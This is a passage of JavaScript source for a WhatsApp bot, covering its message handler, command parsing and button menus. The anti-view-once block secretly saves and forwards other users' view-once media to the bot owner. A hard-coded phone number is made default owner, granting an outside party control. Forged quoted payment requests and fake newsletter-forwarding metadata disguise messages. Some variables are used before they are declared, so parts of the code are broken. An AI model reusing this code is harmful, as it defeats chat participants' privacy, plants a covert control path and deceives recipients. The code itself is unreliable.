  const { generateWAMessageFromContent, proto } = require('blacklord-socket');
  let imageField = {};

  if (options.imageUrl) {
    try {
      let imageBuffer;
      if (options.imageUrl.startsWith('data:')) {
        const encoded = options.imageUrl.split(',')[1];
        if (encoded) imageBuffer = Buffer.from(encoded, 'base64');
      } else if (options.imageUrl.startsWith('http')) {
        const response = await axios.get(options.imageUrl, { responseType: 'arraybuffer', timeout: 12000 });
        imageBuffer = Buffer.from(response.data);
      } else {
        imageBuffer = fs.readFileSync(options.imageUrl);
      }
      if (imageBuffer && imageBuffer.length > 200) {
        const { prepareWAMessageMedia } = require('blacklord-socket');
        imageField = await prepareWAMessageMedia({ image: imageBuffer }, { upload: sock.waUploadToServer });
      }
    } catch (error) {
      console.error('[VARNOX MENU] Image preparation failed:', error.message);
    }
  }

  const menuText = String(options.text || '')
    .split('\n')
    .map(line => `> ${line.replace(/^>\s?/, '')}`)
    .join('\n');

  const interactive = proto.Message.InteractiveMessage.fromObject({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: menuText }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: options.footer || '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐓𝐄𝐂𝐇 𝐈𝐍𝐂' }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: options.title || '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃',
      subtitle: options.subtitle || '',
      hasMediaAttachment: !!imageField.imageMessage,
      ...imageField,
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      buttons: options.buttons || [],
      messageParamsJson: '',
      messageVersion: 1,
    }),
    contextInfo: {},
  });

  const generated = await generateWAMessageFromContent(jid, {
    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
    interactiveMessage: interactive,
  }, { quoted: options.quoted, userJid: sock.user?.id });

  await sock.relayMessage(jid, generated.message, {
    messageId: generated.key.id,
    additionalNodes: [{
      tag: 'biz', attrs: {}, content: [{
        tag: 'interactive', attrs: { type: 'native_flow', v: '1' }, content: [{
          tag: 'native_flow', attrs: { v: '9', name: 'mixed' },
        }],
      }],
    }],
  });
  return generated;
}

// ════════════════════════════════════════════════════════════
//   JUNE ULTRA COMMANDS REGISTERED IN THE VARNOX DISPATCHER
// ════════════════════════════════════════════════════════════
// June modules remain isolated in june-compat, but execution is owned here by
// case.js. This gives every migrated command the same VARNOX context, reply
// helper, permissions, and error handling as native commands.
async function dispatchJuneCommandFromCase({ sock, m, cmd, args, jid, sender, c, isGroup, _isOwner, isBotAdmins, groupMetadata, reply, reaction }) {
  const juneCommand = getJuneCommand(cmd);
  if (!juneCommand) return false;

  try {
    await executeJuneCommand(juneCommand, sock, m, args, {
      from: jid,
      sender,
      prefix: c.prefix || settings.DEFAULT_PREFIX || '.',
      command: cmd,
      isGroup,
      isOwner: _isOwner,
      isSudo: _isOwner,
      isBotAdmin: isBotAdmins,
      groupMetadata,
      reply,
      reaction,
    });
  } catch (error) {
    logError('JUNE COMMAND ' + cmd, error.message);
    await reply(`❌ ${cmd} failed: ${error.message}`);
  }
  return true;
}

// ════════════════════════════════════════════════════════════
//   MAIN HANDLER
// ════════════════════════════════════════════════════════════
async function handleMessage(sock, m, chatMeta = {}) {

  // ── Resolve waNum ─────────────────────────────────────────
  const waNum = sock.__waNum || (sock.user?.id ? normNum(sock.user.id) : 'default');
  if (!sock.__waNum && sock.user?.id) sock.__waNum = normNum(sock.user.id);
  const c    = getWaSettings(waNum);
  const mode = c.mode || 'public';

  logMessage(m, chatMeta);
  storeMessage(m);

  // ── Status broadcast ──────────────────────────────────────
  if (m.key.remoteJid === 'status@broadcast') {
    if (c.autoViewStatus) { try { await sock.readMessages([m.key]); } catch {} }
    if (c.autoLikeStatus) { try { await sock.sendMessage('status@broadcast', { react: { text: '❤️', key: m.key } }); } catch {} }
    return;
  }

  // ── Body – mtype-based ────────────────────────────────────
  const mtype = m.mtype || Object.keys(m.message || {})[0] || '';
  const body = (
    mtype === 'conversation'              ? m.message.conversation :
    mtype === 'imageMessage'              ? m.message.imageMessage.caption :
    mtype === 'videoMessage'              ? m.message.videoMessage.caption :
    mtype === 'extendedTextMessage'       ? m.message.extendedTextMessage.text :
    mtype === 'buttonsResponseMessage'    ? m.message.buttonsResponseMessage.selectedButtonId :
    mtype === 'listResponseMessage'       ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    mtype === 'templateButtonReplyMessage'? m.message.templateButtonReplyMessage.selectedId :
    mtype === 'interactiveResponseMessage'? (() => { try { return JSON.parse(m.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '{}').id || ''; } catch { return ''; } })() :
    mtype === 'messageContextInfo'        ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || '') :
    m.message?.conversation || m.message?.extendedTextMessage?.text || ''
  );

  // ── Core vars ─────────────────────────────────────────────
  const from         = m.key.remoteJid;
  const jid          = from;
  const isGroup      = from.endsWith('@g.us');
  const botNumber    = normNum(sock.user?.id || '');
  const sender       = m.key.fromMe
    ? botNumber + '@s.whatsapp.net'
    : (m.key.participant || m.key.remoteJid);
  const senderNumber = sender.split('@')[0];
  const pushname     = m.pushName || 'No Name';

  // ── Declare command variables ─────────────────────────────
  let cmd, args, text;

  // ════════════════════════════════════════════════════════════
  //   1) STICKER COMMAND DETECTION (runs BEFORE prefix)
  // ════════════════════════════════════════════════════════════
  if (mtype === 'stickerMessage') {
    const sticker = m.message.stickerMessage;
    let hashBytes = sticker.fileSha256;
    if (hashBytes) {
      const buffer = Buffer.isBuffer(hashBytes) ? hashBytes : Buffer.from(hashBytes);
      const hash = buffer.toString('base64');
      const stickerCommands = getStickerCommands();
      if (stickerCommands[hash]) {
        cmd = stickerCommands[hash];
        args = [];
        text = '';
      }
    }
  }

  // ── Chatbot auto‑reply (mention or reply to bot) ──
  const chatbotSettings = getChatbotSettings(jid);
  if (chatbotSettings.enabled && !hasPrefix && body) {
    const botJid = botNumber + '@s.whatsapp.net';
    const normalizedBot = normalizeJid(botJid);

    // Check for mention
    const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    const isMentioned = mentionedJids.some(j => normalizeJid(j) === normalizedBot);

    // Check for reply to a bot message
    const contextInfo = m.message?.extendedTextMessage?.contextInfo || {};
    const quotedMsg = contextInfo.quotedMessage;
    let isReplyToBot = false;
    if (quotedMsg && contextInfo.participant) {
      const quotedSender = contextInfo.participant;
      if (normalizeJid(quotedSender) === normalizedBot) {
        isReplyToBot = true;
      }
    }

    if (isMentioned || isReplyToBot) {
      try {
        await reaction('🤖');
        const response = await getAIResponse(body, chatbotSettings.systemPrompt);
        const finalText = response.slice(0, 4000); // WhatsApp limit
        await sock.sendMessage(jid, { text: finalText }, { quoted: m });
      } catch (err) {
        console.error('Chatbot error:', err);
        await sock.sendMessage(jid, { text: '❌ AI service error. Please try again later.' }, { quoted: m });
      }
    }
  }

  // ════════════════════════════════════════════════════════════
  //   2) PREFIX / PREFIX‑FREE PARSING (if cmd not set by sticker)
  // ════════════════════════════════════════════════════════════
  const storedPrefix = c.prefix || settings.DEFAULT_PREFIX || '.';
  const hasPrefix = body.startsWith(storedPrefix);
  const isPrefixFree = c.prefixfree === true;

  // Native-flow/list buttons can return either the prefixed row ID or only
  // its visible command name depending on the WhatsApp client. Normalize
  // both forms before the normal prefix gate so category buttons always work.
  if (!cmd && (mtype === 'interactiveResponseMessage' || mtype === 'listResponseMessage' || mtype === 'buttonsResponseMessage' || mtype === 'templateButtonReplyMessage' || mtype === 'messageContextInfo')) {
    const rawButtonCommand = String(body || '').trim().toLowerCase();
    const withoutPrefix = storedPrefix && rawButtonCommand.startsWith(storedPrefix.toLowerCase())
      ? rawButtonCommand.slice(storedPrefix.length)
      : rawButtonCommand;
    const compactButtonCommand = withoutPrefix.replace(/[\s_-]+/g, '');
    const buttonAliases = {
      all: 'allmenu_part1',
      allmenu: 'allmenu_part1',
      'all menu': 'allmenu_part1',
      groupmenu: 'cat_groupmenu',
      'group menu': 'cat_groupmenu',
      aimenu: 'cat_aimenu',
      'ai menu': 'cat_aimenu',
    };
    const categoryNameRoute = MENU_CATEGORY_MAP.has(withoutPrefix)
      ? `cat_${withoutPrefix}`
      : (MENU_CATEGORY_MAP.has(compactButtonCommand) ? `cat_${compactButtonCommand}` : '');
    const normalizedButtonCommand = withoutPrefix.startsWith('cat_')
      ? withoutPrefix
      : (buttonAliases[withoutPrefix] || buttonAliases[compactButtonCommand] || categoryNameRoute || withoutPrefix);
    if (normalizedButtonCommand === 'allmenu_part1' || normalizedButtonCommand.startsWith('cat_') || MENU_CATEGORY_MAP.has(normalizedButtonCommand)) {
      cmd = normalizedButtonCommand;
      args = [];
      text = '';
    }
  }

  if (!cmd && !hasPrefix && !isPrefixFree) return;

  if (!cmd) {
    if (hasPrefix) {
      const parts = body.slice(storedPrefix.length).trim().split(/\s+/);
      cmd = parts[0]?.toLowerCase();
      args = parts.slice(1);
      text = args.join(' ');
    } else if (isPrefixFree) {
      const parts = body.trim().split(/\s+/);
      cmd = parts[0]?.toLowerCase();
      args = parts.slice(1);
      text = args.join(' ');
      if (!cmd) return;
    }
  }

  // Canonicalize direct typed/category responses as well as native-flow IDs.
  // Some clients return `.groupmenu`/`.aimenu` instead of `cat_groupmenu`.
  if (cmd === 'groupmenu' || cmd === 'aimenu') cmd = `cat_${cmd}`;
  if (cmd === 'all') cmd = 'allmenu_part1';

  // Support both menu formats without changing the command set:
  //   .menu / .menufast / .menu-pill -> native-flow pill buttons
  //   .menuraw / .menu-raw / .allmenu_raw -> reliable raw text/image
  let menuFormatOverride = null;
  if (cmd) {
    const menuVariant = parseVarnoXMenuVariant(cmd);
    cmd = menuVariant.command;
    menuFormatOverride = menuVariant.format;
  }

  // ── Anti‑view‑once (auto‑forward to owner) ─────────────────
  if (c.antiviewonce) {
    let inner = m.message;
    let isViewOnce = false;
    const viewOnceTypes = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    for (const type of viewOnceTypes) {
      if (inner?.[type]?.message) {
        inner = inner[type].message;
        isViewOnce = true;
        break;
      }
    }

    if (isViewOnce) {
      const imgMsg = inner.imageMessage;
      const vidMsg = inner.videoMessage;
      const audMsg = inner.audioMessage;

      if (imgMsg || vidMsg || audMsg) {
        try {
          // Get owner JID
          const ownerFile = DB('owner.json');
          let kontributor = [];
          try { kontributor = JSON.parse(fs.readFileSync(ownerFile, 'utf8')); } catch { kontributor = []; }
          if (!kontributor.length) {
            if (settings.SUDO_NUMBER) kontributor.push(String(settings.SUDO_NUMBER));
          }
          const ownerNumber = kontributor[0] || botNumber;
          const ownerJid = ownerNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

          if (sender === ownerJid) return;

          const mediaObj = imgMsg ? { imageMessage: imgMsg } :
                           vidMsg ? { videoMessage: vidMsg } :
                           { audioMessage: audMsg };
          const buf = await dlMedia(mediaObj, m.key);

          const chatType = isGroup ? `group ${groupName}` : 'private DM';
          const caption = `📩 View‑once from ${senderNumber} (${pushname}) in ${chatType}`;

          if (imgMsg) await sock.sendMessage(ownerJid, { image: buf, caption });
          else if (vidMsg) await sock.sendMessage(ownerJid, { video: buf, caption });
          else if (audMsg) await sock.sendMessage(ownerJid, { audio: buf, mimetype: 'audio/mpeg', ptt: false });

        } catch (e) {
          console.error('Anti‑view‑once error:', e);
        }
        return;
      }
    }
  }

  // If still no cmd, exit.
  if (!cmd) return;

  // ── isOwner ───────────────────────────────────────────────
  const ownerFile = DB('owner.json');
  let kontributor = [];
  try { kontributor = JSON.parse(fs.readFileSync(ownerFile, 'utf8')); } catch { kontributor = []; }
  if (!kontributor.length) {
    // Set default owner to +254726433254
    kontributor.push('254726433254');
    if (settings.SUDO_NUMBER) kontributor.push(String(settings.SUDO_NUMBER));
    if (c.owner)              kontributor.push(String(c.owner));
  }
  const normalizedSender = normalizeJid(sender);
  const normalizedBot   = normalizeJid(botNumber + '@s.whatsapp.net');

  const ownerNumbers = [botNumber, ...kontributor]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .map(normalizeJid);

  const _isOwner = ownerNumbers.includes(normalizedSender);
  const isBot = normalizedSender === normalizedBot;

  // ── Self mode gate ────────────────────────────────────────
  if (mode === 'self' && !_isOwner && !isBot) return;

  // ── Group metadata & admin flags ──────────────────────────
  const groupMetadata = isGroup ? await sock.groupMetadata(jid).catch(() => ({})) : {};
  const groupName     = isGroup ? groupMetadata.subject || '' : '';
  const participants  = isGroup ? (groupMetadata.participants || []).map(p => {
    let admin = null;
    if (p.admin === 'superadmin') admin = 'superadmin';
    else if (p.admin === 'admin') admin = 'admin';
    return { id: p.id || null, jid: p.jid || p.id || null, admin, full: p };
  }) : [];
  const groupOwner    = isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
  const groupAdmins   = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
  const isBotAdmins   = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') || groupAdmins.includes(botNumber) : false;
  const isAdmins      = isGroup ? groupAdmins.includes(sender) : false;
  const isGroupOwner  = isGroup ? groupOwner === sender : false;

  // ── Styled quoted objects ─────────────────────────────────
  const qpayment = {
    key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: 'ownername', participant: '0@s.whatsapp.net' },
    message: {
      requestPaymentMessage: {
        currencyCodeIso4217: 'USD',
        amount1000: 999999999,
        requestFrom: '0@s.whatsapp.net',
        noteMessage: { extendedTextMessage: { text: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD' } },
        expiryTimestamp: 999999999,
        amount: { value: 91929291929, offset: 1000, currencyCode: 'INR' },
      },
    },
  };

  const qchanel = {
    key: { remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net' },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: '120363408083191758@newsletter',
        newsletterName: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
        jpegThumbnail: '',
        caption: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
        inviteExpiration: Date.now() + 1814400000,
      },
    },
  };

  const qkontak = {
    key: {
      participant: '0@s.whatsapp.net',
      ...(jid ? { remoteJid: 'status@broadcast' } : {}),
    },
    message: {
      contactMessage: {
        displayName: settings.CREDITS || 'james',
        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${settings.CREDITS || 'james'}\nEND:VCARD`,
        sendEphemeral: true,
      },
    },
  };

  const qtext = {
    key: { fromMe: false, participant: '0@s.whatsapp.net', ...(jid ? { remoteJid: '0@s.whatsapp.net' } : {}) },
    message: { extendedTextMessage: { text: `✨ ${settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}` } },
  };

  // ── Log incoming message ──────────────────────────────────
  if (m.message) {
    process.stdout.write('--------------------\n');
    process.stdout.write(`▢ New Message\n`);
    process.stdout.write(
      `   ▢ Date   : ${new Date().toLocaleString()}\n` +
      `   ▢ Body   : ${body || mtype}\n` +
      `   ▢ Sender : ${pushname}\n` +
      `   ▢ JID    : ${senderNumber}\n\n`
    );
  }

  // ── reaction helper ───────────────────────────────────────
  const reaction = async (emoji) => {
    try { await sock.sendMessage(jid, { react: { text: emoji, key: m.key } }); } catch {}
  };

  // ── reply helper ──────────────────────────────────────────
  const blockquote = (text) => text.split('\n').map(line => '> ' + line).join('\n');

  const reply = async (text2) => {
    const out = ft(String(text2), sock);
    const c2 = cfg(sock);

    let title = 'REPLY';
    const rawText = m.text || m.message?.conversation || m.message?.extendedTextMessage?.text || '';
    if (rawText) {
        const prefix = c2.prefix || settings.DEFAULT_PREFIX || '.';
        const trimmed = rawText.trim();
        const cmdPart = trimmed.startsWith(prefix) ? trimmed.slice(prefix.length) : trimmed;
        const firstWord = cmdPart.split(/\s+/)[0] || '';
        if (firstWord) {
            title = firstWord.toUpperCase();
        }
    }

    if (c2.iphoneMode) {
        await sock.sendMessage(jid, { text: "〖𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂〗" });
        const top = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙〘  ${title} 〙 ꪶ ཻུ۪۪ꦽꦼ̷⸙‹━•⩵꙰ཱི࿐`;
        const footer = `╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━•⩵꙰ཱི࿐`;
        const copyright = `© THE JO BOT`;

        const lines = out.split('\n');
        const indented = lines
            .map(line => line.trim() ? `┃ ${line}` : `┃`)
            .join('\n');

        const boxed = `${top}\n${indented}\n${footer}\n${copyright}`;
        const blockquoted = blockquote(boxed);

        const contextInfo = {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
                newsletterName: settings.CHANNEL_NAME || '〖 🟢 𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 🟢 〗'
            }
        };

        await sock.sendMessage(jid, {
            text: blockquoted,
            contextInfo: contextInfo
        }, { quoted: m });

        return;
    }

    const top = `╭━━•›〘 @ ${title} 〙━•⩵꙰ཱི࿐`;
    const lines = out.split('\n');
    const indented = lines.map(line => line.trim() ? `│ ${line}` : `│`).join('\n');
    const footer = `╰━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐`;
    const boxed = `${top}\n${indented}\n${footer}`;

    const blockquoted = blockquote(boxed);

    const contextInfo = {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
            newsletterName: settings.CHANNEL_NAME || '〖 🟢 𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 🟢 〗'
        }
    };

    await sock.sendMessage(jid, { text: "〖𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂〗" });
    await sock.sendMessage(jid, {
        text: blockquoted,
        contextInfo: contextInfo
    }, { quoted: m });
  };

  // ── Guard helpers ─────────────────────────────────────────
  const needGroup  = () => { if (!isGroup) { reply('❌ Group only.').catch(()=>{}); return true; } return false; };
  const needAdmin  = () => {
    if (isAdmins || _isOwner) return false;
    reply('❌ Admins only.').catch(()=>{});
    return true;
  };
  const needBotAdm = () => {
    if (isBotAdmins) return false;
    reply('❌ Add bot as group admin first.').catch(()=>{});
    return true;
  };
  const needOwner  = () => { if (!_isOwner) { reply('❌ Owner only.').catch(()=>{}); return true; } return false; };

  // ════════════════════════════════════════════════════════════
  //   BLACKLORD CHAMBER COMMAND EXECUTION (owner‑locked)
  // ════════════════════════════════════════════════════════════
  

  // ── Button-driven VARNOX menu routes ───────────────────────
  // Interactive row IDs are normalized into `cmd` before this point.
  const menuPrefix = c.prefix || settings.DEFAULT_PREFIX || '.';
  const menuImage = getRotatingMenuImage(c.menuImg || settings.DEFAULT_MENU_IMG);
  const menuWebsite = settings.WEBSITE_URL || 'https://blacklord.tech';
  const menuStatus = {
    botName: c.botName || settings.BOT_NAME || '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃',
    mode,
    uptime: formatUptime(Date.now() - (global.botStartTime || Date.now())),
    totalTools: Object.values(CMDS).reduce((total, commands) => total + (Array.isArray(commands) ? commands.length : 0), 0) + getJuneLoadReport().commandNames + 4,
    prefix: menuPrefix,
  };

  const menuFormat = resolveVarnoXMenuFormat(c, menuFormatOverride);
  if (isVarnoXMenuCommand(cmd)) {
    try {
      const { btn } = await getBlacklordButtons();
      let menuTitle = '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃';
      let menuBody;
      let menuButtons;

      if (cmd === 'menu') {
        const mainMenuBotName = c.botName || settings.BOT_NAME || '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃';
        const mainMenuUptime = formatUptime(Date.now() - (global.botStartTime || Date.now()));
        const mainMenuTools = Object.values(CMDS).reduce((total, commands) => total + (Array.isArray(commands) ? commands.length : 0), 0) + getJuneLoadReport().commandNames + 4;
        menuBody = buildVarnoXMainMenuText({ botName: mainMenuBotName, mode, uptime: mainMenuUptime, totalTools: mainMenuTools, prefix: menuPrefix });
        menuButtons = buildVarnoXMainPillButtons(btn, menuPrefix, menuWebsite);
      } else if (cmd === 'allmenu' || /^allmenu_part[123]$/.test(cmd)) {
        const allMenuBotName = c.botName || settings.BOT_NAME || '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃';
        const allMenuUptime = formatUptime(Date.now() - (global.botStartTime || Date.now()));
        const allMenuTools = Object.values(CMDS).reduce((total, commands) => total + (Array.isArray(commands) ? commands.length : 0), 0) + getJuneLoadReport().commandNames + 4;
        const allMenuPart = cmd === 'allmenu' ? 1 : Number(cmd.slice(-1));
        const statusHeader = buildVarnoXAllMenuStatus({ botName: allMenuBotName, mode, uptime: allMenuUptime, totalTools: allMenuTools, prefix: menuPrefix });
        menuBody = `${statusHeader}\n\n•━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 — PART ${allMenuPart}/3 〙•━•⩵꙰ཱི࿐\n\n${buildAllCommandText(menuPrefix, allMenuPart)}\n\nUse the buttons below to continue browsing.`;
        menuButtons = [
          ...(allMenuPart > 1 ? [btn.reply('_*~𝐏𝐑𝐄𝐕𝐈𝐎𝐔𝐒 𝐏𝐀𝐑𝐓~*_', `${menuPrefix}allmenu_part${allMenuPart - 1}`)] : []),
          ...(allMenuPart < 3 ? [btn.reply('_*~𝐍𝐄𝐗𝐓 𝐏𝐀𝐑𝐓~*_', `${menuPrefix}allmenu_part${allMenuPart + 1}`)] : []),
          btn.reply('_*~𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔~*_', `${menuPrefix}ownermenu`),
          btn.list('_*~𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒~*_', buildCategorySections(menuPrefix)),
        ];
      } else if (cmd === 'ownermenu') {
        const ownerCategory = MENU_CATEGORY_MAP.get('ownermenu');
        const ownerCommands = getMenuCategoryCommands(ownerCategory);
        menuTitle = ownerCategory.title;
        menuBody = buildVarnoXCategoryMenuText(ownerCategory, ownerCommands, menuPrefix, '𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔', menuStatus);
        menuButtons = buildVarnoXCategoryPillButtons(btn, menuPrefix, ownerCommands, menuWebsite);
      } else if (cmd === 'categories') {
        menuBody = `_*~𝐕Λ𝐑𝐍𝐎𝐗  𝐗   𝐌𝐃~*_\n\n📂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒\n\n${buildCategoryIndexText()}\n\nChoose ALL MENU for the complete command list in three parts.\nChoose a category below to open its commands.`;
        menuButtons = [
          btn.url('_*~𝐕𝐈𝐒𝐈𝐓 𝐖𝐄𝐁𝐒𝐈𝐓𝐄~*_', menuWebsite),
          btn.reply('_*~𝐀𝐋𝐋 𝐌𝐄𝐍𝐔~*_', `${menuPrefix}allmenu_part1`),
          btn.list('_*~𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒~*_', buildCategorySections(menuPrefix)),
        ];
      } else {
        const category = MENU_CATEGORY_MAP.get(cmd.slice(4));
        if (!category) {
          await reply('❌ Category not found. Choose CATEGORIES from the menu.');
          return;
        }
        const commands = getMenuCategoryCommands(category);
        menuTitle = category.title;
        menuBody = buildVarnoXCategoryMenuText(category, commands, menuPrefix, category.title, menuStatus);
        menuButtons = buildVarnoXCategoryPillButtons(btn, menuPrefix, commands, menuWebsite);
      }

      const menuPayload = {
        text: menuBody,
        title: menuTitle,
        subtitle: 'Tap a button — no typing required',
        footer: '𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐓𝐄𝐂𝐇 𝐈𝐍𝐂',
        imageUrl: menuImage,
        buttons: menuButtons,
        quoted: qchanel,
      };
      if (menuFormat === 'raw') {
        await sendVarnoXRawMenu(sock, jid, menuPayload);
      } else {
        await sendVarnoXInteractiveMenu(sock, jid, menuPayload);
      }
      return;
    } catch (error) {
      console.error('[VARNOX MENU] Navigation failed:', error);
      await reply(`❌ Menu navigation failed: ${error.message}`);
      return;
    }
  }

  // ── Start switch ──────────────────────────────────────────
  switch (cmd) {

    // ══════════════════════════════════════════════════════
    //   GENERAL
    // ══════════════════════════════════════════════════════


    case 'samsung':
    case 'blacklord':
    case 'menu': {
      try {
        await reaction('🌹');
        const { date, time } = getDateTime();
        const up = formatUptime(Date.now() - global.botStartTime);
        const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
        const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
        const owner = kontributor[0] || botNumber;
        const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

        let menuText = `
    
      •━═ 〘  _*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_   〙═━• 
    
`;
        menuText += ` ╭═━⪩ 〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐\n`;
        menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗔𝗜: ${botName} 🟢\n`;
        menuText += ` │⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: ${settings.VERSION || '1.0.0'}\n`;
        menuText += ` │⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}\n`;
        menuText += ` │⫹⫺ 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗜𝗠𝗘: ${up}\n`;
        menuText += ` │⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${total}\n`;
        menuText += ` │⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}\n`;
        menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗡𝗘𝗧𝗪𝗢𝗥𝗞: ${settings.COMPANY || 'N/A'}\n`;
        menuText += ` ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n\n`;

        menuText += ` •━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〙•━•⩵꙰ཱི࿐\n\n`;

        for (const [cat, list] of Object.entries(CMDS)) {
          if (!list || list.length === 0) continue;
          menuText += `> ╭═━⪩ 〖  ${cat.toUpperCase()}  〗═══━•⩵꙰ཱི࿐\n`;
          list.forEach(cmd => {
            menuText += `> │❍ ${cmd}\n`;
          });
          menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
        }

        // ── BLACKLORD CHAMBER PLUGINS ────────────────────────────────
        if (pluginNames.length > 0) {
          menuText += `> ╭═━⪩ 〖  BLACKLORD CHAMBER  〗═══━•⩵꙰ཱི࿐\n`;
          for (const pn of pluginNames) {
            menuText += `> │❍ ${pn}\n`;
          }
          menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
        }

        const imgUrl = getRotatingMenuImage(c.menuImg || settings.DEFAULT_MENU_IMG);
        let imgField = {};
        if (!c.iphoneMode && imgUrl) {
          try {
            let imgBuf;
            if (imgUrl.startsWith('data:')) {
              const b64 = imgUrl.split(',')[1];
              if (b64) imgBuf = Buffer.from(b64, 'base64');
            } else if (imgUrl.startsWith('http')) {
              const res = await axios.get(imgUrl, { responseType: 'arraybuffer', timeout: 12000 });
              imgBuf = Buffer.from(res.data);
            } else {
              imgBuf = fs.readFileSync(imgUrl);
            }
            if (imgBuf && imgBuf.length > 200) {
              const { prepareWAMessageMedia } = require('blacklord-socket');
              imgField = await prepareWAMessageMedia({ image: imgBuf }, { upload: sock.waUploadToServer });
            }
          } catch (e) {
            console.error('Menu image preparation error:', e.message);
          }
        }

        // One message: artwork in the interactive header, menu text in the body,
        // and native Blacklord buttons below it. No channel or forwarded metadata.
        const { btn } = await getBlacklordButtons();
        const { generateWAMessageFromContent, proto } = require('blacklord-socket');
        const menuMessage = await generateWAMessageFromContent(jid, {
          ephemeralMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: menuText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: `${settings.COMPANY || 'VARNOX X TECH INC'} • Choose an option` }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: botName,
                  hasMediaAttachment: !!imgField.imageMessage,
                  ...imgField
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [
                    btn.reply('All Commands', `${prefix}allmenu`),
                    btn.reply('Bot Info', `${prefix}botinfo`)
                  ],
                  messageParamsJson: ''
                }),
                contextInfo: {}
              })
            }
          }
        }, { quoted: qchanel });
        await sock.relayMessage(jid, menuMessage.message, {
          messageId: menuMessage.key.id,
